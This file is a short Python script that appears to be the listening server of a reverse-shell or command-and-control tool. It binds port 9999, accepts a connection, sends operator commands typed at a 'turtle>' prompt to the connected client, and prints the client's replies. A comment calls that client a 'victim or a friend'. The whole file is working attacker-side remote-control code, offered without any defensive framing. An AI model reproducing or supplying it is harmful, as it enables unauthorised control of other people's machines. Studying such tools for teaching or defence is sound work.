import socket
import sys
import threading
from queue import Queue
import time


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

global conn
global address

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    global conn
    global address
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    

# Send commands to client/victim or a friend
def send_commands():
    global s
    while True:
        cmd = input('turtle> ')
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            print("Message has been sent")

           

def recv_commands():
    
    while True:
        print("")
#        time.sleep(2)
        client_response = str(conn.recv(1024),"utf-8")
        if len(client_response) > 0:
            print(client_response, end="")



# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    global conn
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            socket_accept()
            recv_commands()
        if x == 2:
            send_commands()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()



create_workers()
create_jobs()






# def main():
#     create_socket()
#     bind_socket()
#     socket_accept()


# main()







